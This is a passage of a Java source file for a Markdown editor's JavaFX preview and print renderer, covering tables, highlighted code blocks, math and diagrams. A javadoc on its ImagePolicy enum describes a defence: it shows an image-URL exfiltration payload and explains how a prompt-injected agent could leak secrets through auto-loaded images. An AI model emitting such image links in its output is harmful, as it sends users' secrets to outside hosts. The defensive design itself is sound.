package com.editora.editor;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.Locale;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import javafx.application.Platform;
import javafx.geometry.Pos;
import javafx.scene.Node;
import javafx.scene.control.CheckBox;
import javafx.scene.control.Label;
import javafx.scene.control.Separator;
import javafx.scene.control.Tooltip;
import javafx.scene.image.ImageView;
import javafx.scene.layout.ColumnConstraints;
import javafx.scene.layout.GridPane;
import javafx.scene.layout.HBox;
import javafx.scene.layout.Pane;
import javafx.scene.layout.Priority;
import javafx.scene.layout.StackPane;
import javafx.scene.layout.VBox;
import javafx.scene.text.Text;
import javafx.scene.text.TextFlow;

import org.commonmark.ext.autolink.AutolinkExtension;
import org.commonmark.ext.footnotes.FootnoteDefinition;
import org.commonmark.ext.footnotes.FootnoteReference;
import org.commonmark.ext.footnotes.FootnotesExtension;
import org.commonmark.ext.footnotes.InlineFootnote;
import org.commonmark.ext.front.matter.YamlFrontMatterBlock;
import org.commonmark.ext.front.matter.YamlFrontMatterExtension;
import org.commonmark.ext.front.matter.YamlFrontMatterNode;
import org.commonmark.ext.gfm.strikethrough.Strikethrough;
import org.commonmark.ext.gfm.strikethrough.StrikethroughExtension;
import org.commonmark.ext.gfm.tables.TableBlock;
import org.commonmark.ext.gfm.tables.TableCell;
import org.commonmark.ext.gfm.tables.TableRow;
import org.commonmark.ext.gfm.tables.TablesExtension;
import org.commonmark.ext.ins.Ins;
import org.commonmark.ext.ins.InsExtension;
import org.commonmark.ext.task.list.items.TaskListItemMarker;
import org.commonmark.ext.task.list.items.TaskListItemsExtension;
import org.commonmark.node.BlockQuote;
import org.commonmark.node.BulletList;
import org.commonmark.node.Code;
import org.commonmark.node.Emphasis;
import org.commonmark.node.FencedCodeBlock;
import org.commonmark.node.HardLineBreak;
import org.commonmark.node.Heading;
import org.commonmark.node.HtmlBlock;
import org.commonmark.node.HtmlInline;
import org.commonmark.node.IndentedCodeBlock;
import org.commonmark.node.Link;
import org.commonmark.node.ListItem;
import org.commonmark.node.OrderedList;
import org.commonmark.node.Paragraph;
import org.commonmark.node.SoftLineBreak;
import org.commonmark.node.StrongEmphasis;
import org.commonmark.node.ThematicBreak;
import org.commonmark.parser.Parser;
import org.eclipse.tm4e.core.grammar.IGrammar;
import org.fxmisc.richtext.model.StyleSpan;
import org.fxmisc.richtext.model.StyleSpans;

/**
 * Renders Markdown to native JavaFX nodes for the in-editor preview. Parsing (CommonMark + GFM
 * extensions: tables, strikethrough, task lists, autolinks) is a pure off-thread step
 * ({@link #parseToDocument}); building the JavaFX node tree must run on the FX thread
 * ({@link #renderDocument}). Colors/sizes come from CSS ({@code .markdown-preview} + {@code .md-*}
 * classes), so the preview follows the active editor theme.
 */
public final class MarkdownRenderer {

    private static final double MAX_IMAGE_WIDTH = 700;
    /** Readable column width (GitHub-style): the content is capped to this and centered in the pane. */
    private static final double MAX_CONTENT_WIDTH = 860;
    /** Point sizes passed to JLaTeXMath for inline {@code $…$} and display {@code $$…$$} math. */
    private static final double INLINE_MATH_SIZE = 16;

    private static final double DISPLAY_MATH_SIZE = 20;

    /** Parser/text extensions, shared so the AST and the plain-text rendering stay in sync. (The
     *  heading-anchor extension is renderer-only — it's added to the HTML renderer in {@code
     *  MarkdownHtmlExport}, not here.) */
    static final List<org.commonmark.Extension> EXTENSIONS = List.of(
            TablesExtension.create(),
            StrikethroughExtension.create(),
            TaskListItemsExtension.create(),
            AutolinkExtension.create(),
            YamlFrontMatterExtension.create(),
            FootnotesExtension.create(),
            InsExtension.create());

    private static final Parser PARSER = Parser.builder().extensions(EXTENSIONS).build();

    /** Renders the same AST to plain text (markup stripped) — "what you see" in the preview, for copy. */
    private static final org.commonmark.renderer.text.TextContentRenderer TEXT_RENDERER =
            org.commonmark.renderer.text.TextContentRenderer.builder()
                    .extensions(EXTENSIONS)
                    .build();

    private MarkdownRenderer() {}

    /** Parses Markdown to a CommonMark AST. Pure CPU — safe to call off the FX thread. */
    public static org.commonmark.node.Node parseToDocument(String markdown) {
        return PARSER.parse(markdown == null ? "" : markdown);
    }

    /** The Markdown rendered to plain text (the visible text with markup removed) — for "Copy" from the
     *  preview. Pure CPU; safe to call off the FX thread. */
    public static String plainText(String markdown) {
        return TEXT_RENDERER.render(parseToDocument(markdown));
    }

    /** Builds a JavaFX node tree from a parsed AST. MUST run on the FX thread (creates Text/ImageView). */
    public static Node renderDocument(org.commonmark.node.Node ast, Path baseDir) {
        return renderDocument(ast, baseDir, null);
    }

    /**
     * Overload that also wires links to a click handler — invoked with the link's raw destination
     * (as written in the Markdown; never resolved/normalized) when a rendered link is clicked. Used by the
     * live, interactive preview so a link opens in the system browser; pass {@code null} for
     * non-interactive renders (print/PDF don't build this JavaFX tree at all, and the hover/completion-doc
     * popups pass null since they're ephemeral display surfaces, not meant to be clicked through).
     */
    public static Node renderDocument(
            org.commonmark.node.Node ast, Path baseDir, java.util.function.Consumer<String> onLinkClick) {
        return renderDocument(ast, baseDir, onLinkClick, ImagePolicy.DOCUMENT);
    }

    /**
     * Which images a render may load. An image loads the moment it is rendered, with no click — so on a
     * surface whose Markdown the user did not write, {@code ![](https://host/?d=<secret>)} is an outbound
     * request somebody else chose. A prompt-injected agent can exfiltrate through it past its own network
     * permissions; a language server's hover text or a pull-request body can do the same.
     */
    public enum ImagePolicy {
        /** The user's own document (preview, print): files beside it, {@code data:} URIs, and public
         *  {@code http(s)} hosts through {@link PreviewImageLoader}'s internal-address guard. */
        DOCUMENT,
        /** Text from elsewhere — agent replies, LSP hover / completion docs, PR bodies: only self-contained
         *  {@code data:} URIs load; anything else renders as a placeholder naming the alt text and URL. */
        DATA_ONLY;

        /** Whether an image at {@code url} (already resolved to an absolute URL) may load. Pure; unit-tested. */
        boolean allows(String url) {
            if (url == null || url.isBlank()) {
                return false;
            }
            return this == DOCUMENT || url.stripLeading().regionMatches(true, 0, "data:", 0, 5);
        }
    }

    /** As {@link #renderDocument(org.commonmark.node.Node, Path, java.util.function.Consumer)}, with an
     *  explicit {@link ImagePolicy} — every surface that renders Markdown it did not get from the user's own
     *  file passes {@link ImagePolicy#DATA_ONLY}. */
    public static Node renderDocument(
            org.commonmark.node.Node ast,
            Path baseDir,
            java.util.function.Consumer<String> onLinkClick,
            ImagePolicy images) {
        return renderDocument(
                ast,
                new RenderContext(baseDir, onLinkClick, images == null ? ImagePolicy.DATA_ONLY : images, false, null));
    }

    /**
     * Builds the node tree for <b>print</b>: the same blocks as the preview, but final the moment this returns.
     *
     * <p>The preview fills images, Mermaid diagrams and syntax colours in later, from background loads. A
     * printed page is measured, packed and sent in one pulse, so "later" is after the paper: fences printed
     * uncoloured, and an image that measured 0px while loading grew afterwards and pushed the rest of its
     * page off the sheet. Here they come from {@code assets}, resolved beforehand off the FX thread
     * ({@link MarkdownPrintAssets#resolve}); an image that did not load prints as its alt text.
     *
     * <p>Print is also always light, so math is rasterised dark-on-white whatever the app theme is, and a
     * code block is one node per line so the paginator can cut it between lines (see {@link #printCodeBlock}).
     *
     * <p>With {@code assets} null the document was not resolved: images and diagrams then load in the
     * background as the preview's do and code prints uncoloured. Only for callers that cannot block first.
     */
    public static Node renderForPrint(org.commonmark.node.Node ast, Path baseDir, MarkdownPrintAssets assets) {
        return renderDocument(ast, new RenderContext(baseDir, null, ImagePolicy.DOCUMENT, true, assets));
    }

    private static Node renderDocument(org.commonmark.node.Node ast, RenderContext ctx) {
        VBox content = new VBox();
        content.getStyleClass().add("markdown-preview");
        // Cap the readable column width so long lines don't stretch across a wide window (GitHub-style).
        content.setMaxWidth(MAX_CONTENT_WIDTH);
        if (ast != null) {
            appendBlocks(ast, content, ctx);
        }
        // Center the capped-width column within the (fit-to-width) preview pane. A StackPane clamps the
        // content to the available width when the viewport is narrower than the cap, so it never overflows.
        StackPane wrap = new StackPane(content);
        wrap.getStyleClass().add("markdown-preview-wrap");
        StackPane.setAlignment(content, Pos.TOP_CENTER);
        return wrap;
    }

    /** Threaded through every block/inline renderer alongside {@code baseDir} (for image resolution) so a
     *  link's click handler reaches the {@code Link} node without a parameter per call — the pure-{@code
     *  baseDir} idiom this file already used, extended to carry one more per-render input. */
    private record RenderContext(
            Path baseDir,
            java.util.function.Consumer<String> onLinkClick,
            ImagePolicy images,
            boolean print,
            MarkdownPrintAssets assets) {

        /** Whether math is drawn light-on-dark: never on paper, otherwise as the app theme says. */
        Node blockMath(String latex) {
            return print
                    ? MathImages.blockNode(latex, DISPLAY_MATH_SIZE, false)
                    : MathImages.blockNode(latex, DISPLAY_MATH_SIZE);
        }

        Node inlineMath(String latex) {
            return print
                    ? MathImages.inlineNode(latex, INLINE_MATH_SIZE, false)
                    : MathImages.inlineNode(latex, INLINE_MATH_SIZE);
        }
    }

    // --- block level ---------------------------------------------------------------------------

    private static void appendBlocks(org.commonmark.node.Node parent, Pane container, RenderContext ctx) {
        for (org.commonmark.node.Node n = parent.getFirstChild(); n != null; n = n.getNext()) {
            Node fx = renderBlock(n, ctx);
            if (fx != null) {
                container.getChildren().add(fx);
            }
        }
    }

    private static Node renderBlock(org.commonmark.node.Node node, RenderContext ctx) {
        if (node instanceof Heading h) {
            TextFlow tf = inlineFlow(h, ctx);
            tf.getStyleClass().add("md-h" + Math.min(6, Math.max(1, h.getLevel())));
            return tf;
        }
        if (node instanceof Paragraph p) {
            // A paragraph that is just $$…$$ renders as a centered block formula.
            if (MathImages.isEnabled()) {
                String disp = soleDisplayMath(paragraphText(p));
                if (disp != null) {
                    StackPane wrap = new StackPane(ctx.blockMath(disp));
                    wrap.getStyleClass().add("md-math-block-wrap");
                    return new ShrinkToFit(wrap); // a long formula shrinks; it must not widen the column
                }
            }
            // A paragraph that is just an image renders as a block image (not squeezed into a TextFlow).
            if (p.getFirstChild() instanceof org.commonmark.node.Image img && img.getNext() == null) {
                // Fits a pane narrower than the image instead of widening the whole column.
                return new ShrinkToFit(imageNode(img, ctx));
            }
            TextFlow tf = inlineFlow(p, ctx);
            tf.getStyleClass().add("md-paragraph");
            return tf;
        }
        if (node instanceof BlockQuote) {
            VBox box = new VBox();
            box.getStyleClass().add("md-quote");
            appendBlocks(node, box, ctx);
            return box;
        }
        if (node instanceof BulletList bl) {
            return renderList(bl, ctx, false, 1);
        }
        if (node instanceof OrderedList ol) {
            Integer start = ol.getMarkerStartNumber();
            return renderList(ol, ctx, true, start == null ? 1 : start);
        }
        if (node instanceof FencedCodeBlock f) {
            if (isMermaidInfo(f.getInfo()) && MermaidImages.isEnabled()) {
                if (ctx.assets() != null) { // print: already rendered (light), so its size is final now
                    return new ShrinkToFit(MermaidImages.printNode(
                            ctx.assets().diagram(stripTrailingNewline(f.getLiteral())),
                            lw -> Math.min(lw, MAX_CONTENT_WIDTH)));
                }
                // Show at natural size, but never wider than the reading column — and scaled down further
                // when the pane itself is narrower (Split view), so the diagram never widens the column.
                return new ShrinkToFit(MermaidImages.node(
                        stripTrailingNewline(f.getLiteral()), lw -> Math.min(lw, MAX_CONTENT_WIDTH)));
            }
            if (ctx.print()) {
                String code = stripTrailingNewline(f.getLiteral());
                return printCodeBlock(
                        code, ctx.assets() == null ? null : ctx.assets().runs(f.getInfo(), code));
            }
            return highlightedCodeBlock(f.getLiteral(), f.getInfo());
        }
        if (node instanceof IndentedCodeBlock i) {
            return codeBlock(i.getLiteral(), ctx); // indented blocks carry no language → plain
        }
        if (node instanceof ThematicBreak) {
            Separator s = new Separator();
            s.getStyleClass().add("md-hr");
            return s;
        }
        if (node instanceof HtmlBlock hb) {
            if (isHtmlComment(hb.getLiteral())) {
                return null; // HTML comments are invisible (as in GitHub / every Markdown renderer)
            }
            return codeBlock(hb.getLiteral(), ctx); // other raw HTML shown as text (no interpretation)
        }
        if (node instanceof TableBlock tb) {
            return renderTable(tb, ctx);
        }
        if (node instanceof YamlFrontMatterBlock fm) {
            return frontMatterBlock(fm);
        }
        if (node instanceof FootnoteDefinition def) {
            return footnoteDefinition(def, ctx);
        }
        // Unknown block container: render its children.
        VBox box = new VBox();
        appendBlocks(node, box, ctx);
        return box.getChildren().isEmpty() ? null : box;
    }

    /** Whether a raw-HTML literal is an HTML comment ({@code <!-- … -->}) — rendered invisibly. Pure. */
    public static boolean isHtmlComment(String literal) {
        return literal != null && literal.strip().startsWith("<!--");
    }

    private static Node renderList(org.commonmark.node.Node list, RenderContext ctx, boolean ordered, int start) {
        VBox box = new VBox();
        box.getStyleClass().add("md-list");
        int n = start;
        for (org.commonmark.node.Node item = list.getFirstChild(); item != null; item = item.getNext()) {
            if (!(item instanceof ListItem)) {
                continue;
            }
            HBox row = new HBox();
            row.getStyleClass().add("md-list-item");
            TaskListItemMarker task = firstTaskMarker(item);
            Node marker;
            if (task != null) {
                CheckBox cb = new CheckBox();
                cb.setSelected(task.isChecked());
                cb.setDisable(true);
                cb.getStyleClass().add("md-task");
                marker = cb;
            } else {
                Label m = new Label(ordered ? (n + ".") : "•");
                m.getStyleClass().add("md-list-marker");
                marker = m;
            }
            VBox content = new VBox();
            content.getStyleClass().add("md-list-content");
            HBox.setHgrow(content, Priority.ALWAYS);
            appendBlocks(item, content, ctx);
            row.getChildren().addAll(marker, content);
            box.getChildren().add(row);
            n++;
        }
        return box;
    }

    /** A table column never narrower/wider than this many "characters" of weight (keeps short columns
     *  readable and stops one long cell from starving the rest). */
    private static final int MIN_COL_WEIGHT = 6;

    private static final int MAX_COL_WEIGHT = 40;

    /** The horizontal padding on each table cell, expressed in average text-character widths. */
    private static final int TABLE_CELL_PADDING_WEIGHT = 3;

    private static Node renderTable(TableBlock tb, RenderContext ctx) {
        GridPane grid = new GridPane();
        grid.getStyleClass().add("md-table");
        // Fill the preview column so the percent-based ColumnConstraints below have a definite width to
        // distribute; without constraints a long cell forces the others to collapse to ~1 char wide.
        grid.setMaxWidth(Double.MAX_VALUE);

        List<Integer> colWeights = new ArrayList<>();
        int row = 0;
        for (org.commonmark.node.Node section = tb.getFirstChild(); section != null; section = section.getNext()) {
            boolean header = section instanceof org.commonmark.ext.gfm.tables.TableHead;
            for (org.commonmark.node.Node r = section.getFirstChild(); r != null; r = r.getNext()) {
                if (!(r instanceof TableRow)) {
                    continue;
                }
                int col = 0;
                for (org.commonmark.node.Node c = r.getFirstChild(); c != null; c = c.getNext()) {
                    if (!(c instanceof TableCell cell)) {
                        continue;
                    }
                    TextFlow tf = inlineFlow(cell, ctx);
                    tf.getStyleClass().add(header ? "md-table-header" : "md-table-cell");
                    tf.setMaxWidth(Double.MAX_VALUE);
                    if (cell.getAlignment() == TableCell.Alignment.CENTER) {
                        tf.setTextAlignment(javafx.scene.text.TextAlignment.CENTER);
                    } else if (cell.getAlignment() == TableCell.Alignment.RIGHT) {
                        tf.setTextAlignment(javafx.scene.text.TextAlignment.RIGHT);
                    }
                    grid.add(tf, col, row);
                    int len = cellTextLength(cell);
                    if (col < colWeights.size()) {
                        colWeights.set(col, Math.max(colWeights.get(col), len));
                    } else {
                        colWeights.add(len);
                    }
                    col++;
                }
                row++;
            }
        }

        int cols = colWeights.size();
        double total = 0;
        double[] clamped = new double[cols];
        for (int i = 0; i < cols; i++) {
            clamped[i] = tableColumnWeight(colWeights.get(i));
            total += clamped[i];
        }
        for (int i = 0; i < cols; i++) {
            ColumnConstraints cc = new ColumnConstraints();
            cc.setPercentWidth(total > 0 ? clamped[i] / total * 100.0 : 100.0 / Math.max(1, cols));
            cc.setHgrow(Priority.ALWAYS);
            grid.getColumnConstraints().add(cc);
        }
        return grid;
    }

    /**
     * Converts a cell's content length to a proportional table-column width. The visible content needs
     * room in addition to the fixed left and right cell padding; omitting that allowance makes concise
     * columns such as {@code ID}, {@code Priority}, and {@code Smoke} wrap one character at a time.
     */
    static int tableColumnWeight(int textLength) {
        return Math.min(Math.max(textLength + TABLE_CELL_PADDING_WEIGHT, MIN_COL_WEIGHT), MAX_COL_WEIGHT);
    }

    /** Total length of the cell's plain text (across inline markup), used to weight column widths. */
    private static int cellTextLength(org.commonmark.node.Node node) {
        int len = 0;
        for (org.commonmark.node.Node n = node.getFirstChild(); n != null; n = n.getNext()) {
            if (n instanceof org.commonmark.node.Text t) {
                len += t.getLiteral().length();
            } else if (n instanceof Code c) {
                len += c.getLiteral().length();
            } else {
                len += cellTextLength(n);
            }
        }
        return len;
    }

    private static Node codeBlock(String literal, RenderContext ctx) {
        return ctx.print() ? printCodeBlock(stripTrailingNewline(literal), null) : codeBlock(literal);
    }

    /**
     * A code block for print: a box of lines, each its own {@code TextFlow} of token runs.
     *
     * <p>The preview's block is a single node — a wrapping {@code Label}, or one {@code TextFlow} holding
     * the whole listing — and neither survives a page boundary. The label is measured inside a page-high
     * scene, so a 150-line block reported one page of height, was never recognised as over-tall and printed
     * its first 30 lines followed by "...". The flow was recognised, but the paginator could only cut it at
     * its runs or at a space: mid-line, and the rebuilt pieces lost the block's font and colours.
     *
     * <p>One node per line gives the paginator the only cut that is right for code — between lines — and
     * makes the block's height the sum of its lines, so a long listing is split by arithmetic rather than by
     * repeated layout. {@code runs} are the fence's tokens ({@link #tokenizeRuns}), or null to print plain.
     */
    static Node printCodeBlock(String code, List<Run> runs) {
        VBox box = new VBox();
        box.getStyleClass().addAll("md-code-block", "md-code-lines");
        box.setMaxWidth(Double.MAX_VALUE);
        for (List<Run> line : codeLines(runs == null ? List.of(new Run(code, List.of())) : runs)) {
            TextFlow flow = new TextFlow();
            for (Run run : line) {
                Text t = new Text(run.text());
                t.getStyleClass().add("text"); // token rules are `.text.<class>`; plain runs get the fallback
                t.getStyleClass().addAll(run.classes());
                flow.getChildren().add(t);
            }
            box.getChildren().add(flow);
        }
        return box;
    }

    /**
     * Regroups tokenised {@code runs} by source line, splitting any run that spans a line break. An empty
     * line keeps a single space so it still has a line's height when laid out. Pure; unit-tested.
     */
    static List<List<Run>> codeLines(List<Run> runs) {
        List<List<Run>> lines = new ArrayList<>();
        List<Run> cur = new ArrayList<>();
        for (Run run : runs) {
            String text = run.text();
            int from = 0;
            for (int nl = text.indexOf('\n'); nl >= 0; nl = text.indexOf('\n', from)) {
                addRun(cur, text, from, nl, run.classes());
                lines.add(closeLine(cur));
                cur = new ArrayList<>();
                from = nl + 1;
            }
            addRun(cur, text, from, text.length(), run.classes());
        }
        lines.add(closeLine(cur));
        return lines;
    }

    private static void addRun(List<Run> line, String text, int from, int to, List<String> classes) {
        int end = to > from && text.charAt(to - 1) == '\r' ? to - 1 : to; // CRLF: the CR is not content
        if (end > from) {
            line.add(new Run(text.substring(from, end), classes));
        }
    }

    private static List<Run> closeLine(List<Run> line) {
        return line.isEmpty() ? List.of(new Run(" ", List.of())) : line;
    }

    private static Node codeBlock(String literal) {
        Label label = new Label(stripTrailingNewline(literal));
        label.getStyleClass().add("md-code-block");
        label.setWrapText(true);
        label.setMaxWidth(Double.MAX_VALUE);
        return label;
    }

    /** Above this many characters a fenced block renders as plain text (avoids tokenizing a huge block). */
    static final int MAX_HIGHLIGHT_CHARS = 50_000;

    /** One tokenized run: its text + the token style classes ({@code .text.<class>}) to apply. */
    record Run(String text, List<String> classes) {}

    /** Off-FX daemon worker for code-block tokenization (tm4e access must not run on the FX thread). */
    private static final ExecutorService CODE_HIGHLIGHT_POOL = Executors.newSingleThreadExecutor(r -> {
        Thread t = new Thread(r, "md-code-highlight");
        t.setDaemon(true);
        return t;
    });

    /**
     * A fenced code block, syntax-highlighted with the TextMate grammar for its info string (`{@code ```java}`)
     * when one is bundled. The code shows immediately as plain text; tokenizing runs <strong>off the FX
     * thread</strong> (tm4e access must not happen on the FX thread — it would contend/deadlock with the
     * editor's background highlighters and blocks the UI) and the styled {@code Text} runs (carrying the same
     * {@code .text.<class>} classes the editor uses, so it tracks the active theme) are filled in on the FX
     * thread when ready — mirroring {@code MermaidImages}' placeholder-then-fill. Falls back to the plain
     * {@link #codeBlock} when the language is unknown/absent or the block is huge.
     */
    private static Node highlightedCodeBlock(String literal, String info) {
        String code = stripTrailingNewline(literal);
        IGrammar grammar = code.isEmpty() || code.length() > MAX_HIGHLIGHT_CHARS ? null : grammarForInfo(info);
        if (grammar == null) {
            return codeBlock(literal);
        }
        Text initial = new Text(code);
        initial.getStyleClass().add("text");
        TextFlow flow = new TextFlow(initial);
        flow.getStyleClass().add("md-code-block");
        flow.setMaxWidth(Double.MAX_VALUE);
        CODE_HIGHLIGHT_POOL.execute(() -> {
            List<Run> runs = tokenizeRuns(code, grammar);
            if (runs == null) {
                return; // tokenize failed — leave the plain text
            }
            Platform.runLater(() -> {
                List<Text> nodes = new ArrayList<>(runs.size());
                for (Run run : runs) {
                    Text t = new Text(run.text());
                    t.getStyleClass().add("text"); // token rules are `.text.<class>`; plain runs get the fallback
                    t.getStyleClass().addAll(run.classes());
                    nodes.add(t);
                }
                flow.getChildren().setAll(nodes);
            });
        });
        return flow;
    }

    /** Off-thread: tokenizes {@code code} into styled runs, or {@code null} on failure. */
    static List<Run> tokenizeRuns(String code, IGrammar grammar) {
        try {
            StyleSpans<Collection<String>> spans = TextMateHighlighter.compute(code, grammar);
            List<Run> runs = new ArrayList<>();
            int pos = 0;
            for (StyleSpan<Collection<String>> span : spans) {
                int end = Math.min(code.length(), pos + span.getLength());
                if (end <= pos) {
                    continue;
                }
                runs.add(new Run(code.substring(pos, end), List.copyOf(span.getStyle())));
                pos = end;
            }
            if (pos < code.length()) {
                runs.add(new Run(code.substring(pos), List.of()));
            }
            return runs;
        } catch (RuntimeException e) {
            return null;
        }
    }

    /** Common fence info-string aliases → a file extension the {@link GrammarRegistry} recognizes. */
    private static final Map<String, String> INFO_EXT = Map.ofEntries(
            Map.entry("javascript", "js"),
            Map.entry("js", "js"),
            Map.entry("node", "js"),
            Map.entry("typescript", "ts"),
            Map.entry("ts", "ts"),
            Map.entry("jsx", "jsx"),
            Map.entry("tsx", "tsx"),
            Map.entry("python", "py"),
            Map.entry("py", "py"),
            Map.entry("ruby", "rb"),
            Map.entry("rb", "rb"),
            Map.entry("rust", "rs"),
            Map.entry("rs", "rs"),
            Map.entry("golang", "go"),
            Map.entry("go", "go"),
            Map.entry("bash", "sh"),
            Map.entry("shell", "sh"),
            Map.entry("sh", "sh"),
            Map.entry("zsh", "sh"),
            Map.entry("cpp", "cpp"),
            Map.entry("c++", "cpp"),
            Map.entry("csharp", "cs"),
            Map.entry("cs", "cs"),
            Map.entry("c#", "cs"),
            Map.entry("kotlin", "kt"),
            Map.entry("kt", "kt"),
            Map.entry("yml", "yaml"),
            Map.entry("yaml", "yaml"),
            Map.entry("markdown", "md"),
            Map.entry("md", "md"));

    /** The bundled grammar for a fence info string (first token, case-insensitive), or {@code null}. */
    public static IGrammar grammarForInfo(String info) {
        if (info == null || info.isBlank()) {
            return null;
        }
        String lang = info.trim().split("\\s+")[0].toLowerCase(Locale.ROOT);
        GrammarRegistry reg = GrammarRegistry.shared();
        IGrammar g = reg.forLanguageName(lang); // full language names: java, python, shell, typescript, …
        if (g == null) {
            g = reg.forFileName("x." + INFO_EXT.getOrDefault(lang, lang)); // extension-style: js, py, sh, …
        }
        return g;
    }

    /** YAML front matter rendered as a muted key/value metadata block at the top of the document. */
    private static Node frontMatterBlock(YamlFrontMatterBlock fm) {
        VBox box = new VBox();
        box.getStyleClass().add("md-frontmatter");
        for (org.commonmark.node.Node n = fm.getFirstChild(); n != null; n = n.getNext()) {
            if (n instanceof YamlFrontMatterNode meta) {
                Label row = new Label(meta.getKey() + ": " + String.join(", ", meta.getValues()));
                row.getStyleClass().add("md-frontmatter-row");
                row.setWrapText(true);
                box.getChildren().add(row);
            }
        }
        return box.getChildren().isEmpty() ? null : box;
    }

    /** A footnote definition: its label marker followed by the definition's block content. */
    private static Node footnoteDefinition(FootnoteDefinition def, RenderContext ctx) {
        HBox row = new HBox();
        row.getStyleClass().add("md-footnote-def");
        Label marker = new Label("[" + def.getLabel() + "]");
        marker.getStyleClass().add("md-footnote-def-marker");
        VBox content = new VBox();
        content.getStyleClass().add("md-footnote-def-content");
        HBox.setHgrow(content, Priority.ALWAYS);
        appendBlocks(def, content, ctx);
        row.getChildren().addAll(marker, content);
        return row;
    }

    /** An inline footnote reference, rendered as a small raised {@code [label]} marker. */
    private static Text footnoteRef(String label) {
        Text t = new Text("[" + (label == null ? "" : label) + "]");
        t.getStyleClass().addAll("md-text", "md-footnote-ref");
        return t;
    }

    /** Whether a fenced block's info string marks it as Mermaid (first token, case-insensitive). */
    static boolean isMermaidInfo(String info) {
        if (info == null) {
            return false;
        }
        String first = info.strip().split("\\s+", 2)[0];
        return first.equalsIgnoreCase("mermaid");
    }

    // --- inline level --------------------------------------------------------------------------

    private static TextFlow inlineFlow(org.commonmark.node.Node block, RenderContext ctx) {
        TextFlow flow = new TextFlow();
        appendInline(block, flow, List.of(), ctx);
        return flow;
    }

    private static void appendInline(
            org.commonmark.node.Node parent, TextFlow flow, List<String> styles, RenderContext ctx) {
        for (org.commonmark.node.Node n = parent.getFirstChild(); n != null; n = n.getNext()) {
            emitInline(n, flow, styles, ctx);
        }
    }

    private static void emitInline(org.commonmark.node.Node n, TextFlow flow, List<String> styles, RenderContext ctx) {
        if (n instanceof org.commonmark.node.Text t) {
            if (MathImages.isEnabled()) {
                appendTextWithMath(t.getLiteral(), flow, styles, ctx);
            } else {
                flow.getChildren().add(styledText(t.getLiteral(), styles));
            }
        } else if (n instanceof Code c) {
            flow.getChildren().add(inlineCode(c.getLiteral()));
        } else if (n instanceof Emphasis) {
            appendInline(n, flow, with(styles, "md-italic"), ctx);
        } else if (n instanceof StrongEmphasis) {
            appendInline(n, flow, with(styles, "md-bold"), ctx);
        } else if (n instanceof Strikethrough) {
            appendInline(n, flow, with(styles, "md-strike"), ctx);
        } else if (n instanceof Ins) {
            appendInline(n, flow, with(styles, "md-ins"), ctx);
        } else if (n instanceof FootnoteReference ref) {
            flow.getChildren().add(footnoteRef(ref.getLabel()));
        } else if (n instanceof InlineFootnote) {
            appendInline(n, flow, with(styles, "md-footnote-ref"), ctx);
        } else if (n instanceof Link link) {
            int from = flow.getChildren().size();
            appendInline(n, flow, with(styles, "md-link"), ctx);
            installLinkTooltip(flow, from, link.getDestination());
            installLinkClick(flow, from, link.getDestination(), ctx.onLinkClick());
        } else if (n instanceof org.commonmark.node.Image img) {
            flow.getChildren().add(imageNode(img, ctx));
        } else if (n instanceof SoftLineBreak) {
            flow.getChildren().add(new Text(" "));
        } else if (n instanceof HardLineBreak) {
            flow.getChildren().add(new Text("\n"));
        } else if (n instanceof HtmlInline h) {
            if (!isHtmlComment(h.getLiteral())) {
                flow.getChildren().add(inlineCode(h.getLiteral())); // skip inline HTML comments
            }
        } else if (n instanceof TaskListItemMarker) {
            // rendered as a CheckBox by renderList — skip here
        } else {
            appendInline(n, flow, styles, ctx); // unknown inline: descend
        }
    }

    /** Inline code as a {@code Label} so it can carry a GitHub-style rounded gray background (a
     *  {@link Text} can only fill its glyphs). Flows inline inside the surrounding {@link TextFlow}. */
    private static Label inlineCode(String literal) {
        Label code = new Label(literal);
        code.getStyleClass().add("md-inline-code");
        return code;
    }

    /** Splits a text run into literal text + inline math (rendered as small images). */
    private static void appendTextWithMath(String literal, TextFlow flow, List<String> styles, RenderContext ctx) {
        for (MathSpans.Segment seg : MathSpans.segments(literal)) {
            if (seg.span() == null) {
                if (!seg.text().isEmpty()) {
                    flow.getChildren().add(styledText(seg.text(), styles));
                }
            } else {
                flow.getChildren().add(ctx.inlineMath(seg.span().latex()));
            }
        }
    }

    /** The concatenated literal text of a paragraph's inline children, or null if it isn't pure text. */
    static String paragraphText(Paragraph p) {
        StringBuilder sb = new StringBuilder();
        for (org.commonmark.node.Node c = p.getFirstChild(); c != null; c = c.getNext()) {
            if (c instanceof org.commonmark.node.Text t) {
                sb.append(t.getLiteral());
            } else if (c instanceof SoftLineBreak || c instanceof HardLineBreak) {
                sb.append(' '); // a $$…$$ block spans lines as soft breaks — join them, don't bail
            } else {
                return null; // contains real markup → not a bare display-math paragraph
            }
        }
        return sb.toString();
    }

    /** If {@code text} is exactly one {@code $$…$$} display-math span, its LaTeX; else null. */
    static String soleDisplayMath(String text) {
        if (text == null) {
            return null;
        }
        String trimmed = text.strip();
        List<MathSpans.Span> spans = MathSpans.find(trimmed);
        if (spans.size() == 1) {
            MathSpans.Span s = spans.get(0);
            if (s.display() && s.start() == 0 && s.end() == trimmed.length()) {
                return s.latex();
            }
        }
        return null;
    }

    private static Text styledText(String s, List<String> styles) {
        Text t = new Text(s);
        t.getStyleClass().add("md-text");
        t.getStyleClass().addAll(styles);
        return t;
    }

    private static void installLinkTooltip(TextFlow flow, int from, String dest) {
        if (dest == null || dest.isBlank()) {
            return;
        }
        Tooltip tip = new Tooltip(dest);
        for (int i = from; i < flow.getChildren().size(); i++) {
            Tooltip.install(flow.getChildren().get(i), tip);
        }
    }

    /** Wires a rendered link's run of nodes to {@code onLinkClick} (hand cursor + click → the link's raw
     *  destination, unresolved — matching the existing Ctrl/Cmd-click-in-source behavior). No-op when
     *  there's no handler (print/PDF/popups) or the link has no destination. */
    private static void installLinkClick(
            TextFlow flow, int from, String dest, java.util.function.Consumer<String> onLinkClick) {
        if (onLinkClick == null || dest == null || dest.isBlank()) {
            return;
        }
        for (int i = from; i < flow.getChildren().size(); i++) {
            Node child = flow.getChildren().get(i);
            child.setCursor(javafx.scene.Cursor.HAND);
            child.setOnMouseClicked(e -> onLinkClick.accept(dest));
        }
    }

    private static Node imageNode(org.commonmark.node.Image img, RenderContext ctx) {
        String alt = imageAlt(img);
        String url = resolveUrl(img.getDestination(), ctx.baseDir());
        if (url == null) {
            return inlineCode(imagePlaceholder(alt, null));
        }
        if (!ctx.images().allows(url)) {
